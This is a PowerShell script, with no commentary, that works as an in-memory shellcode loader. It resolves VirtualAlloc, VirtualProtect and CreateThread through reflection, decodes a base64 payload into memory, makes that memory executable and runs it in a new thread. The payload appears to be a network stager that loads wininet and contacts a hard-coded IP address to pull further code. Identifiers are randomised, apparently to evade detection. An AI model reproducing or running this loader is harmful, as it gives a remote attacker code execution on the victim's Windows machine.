function yL {
        Param ($biZje, $iy)
        $lrk = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $lrk.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($lrk.GetMethod('GetModuleHandle')).Invoke($null, @($biZje)))), $iy))
}

function tR {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $tTgG,
                [Parameter(Position = 1)] [Type] $k2C = [Void]
        )

        $sF5 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $sF5.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $tTgG).SetImplementationFlags('Runtime, Managed')
        $sF5.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $k2C, $tTgG).SetImplementationFlags('Runtime, Managed')

        return $sF5.CreateType()
}

[Byte[]]$qB = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSUWVIi1JgSItSGFZIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJIi1IgQVGLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBQSQHQ41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYSAHQQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6BAAAAAyMTAuMjE1LjEyOS4xMTEAWkiJwUnHwLgiAABNMclTU2oDU0m6V4mfxgAAAAD/1egnAAAAL1E2WlpWV05kbV8wU21ST2Jkc25YRVE0dDVFcm1OZ2c0Uy1FdUUASInBU1pBWE0xyVNIuAAyqIQAAAAAUFNTScfC61UuO//VSInGagpfSInxah9aUmiAMwAASYngagRBWUm6dUaehgAAAAD/1U0xwFNaSInxTTHJTTHJU1NJx8ItBhh7/9WFwHUfSMfBiBMAAEm6RPA14AAAAAD/1Uj/z3QC66roVQAAAFNZakBaSYnRweIQScfAABAAAEm6WKRT5QAAAAD/1UiTU1NIiedIifFIidpJx8AAIAAASYn5SboSloniAAAAAP/VSIPEIIXAdLJmiwdIAcOFwHXSWMNYagBZScfC8LWiVv/V")
[Uint32]$fES = 0
$yQW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((yL kernel32.dll VirtualAlloc), (tR @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $qB.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($qB, 0, $yQW, $qB.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((yL kernel32.dll VirtualProtect), (tR @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($yQW, [Uint32]$qB.Length, 0x10, [Ref]$fES)) -eq $true) {
        $jV = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((yL kernel32.dll CreateThread), (tR @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$yQW,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((yL kernel32.dll WaitForSingleObject), (tR @([IntPtr], [Int32]))).Invoke($jV,0xffffffff) | Out-Null
}
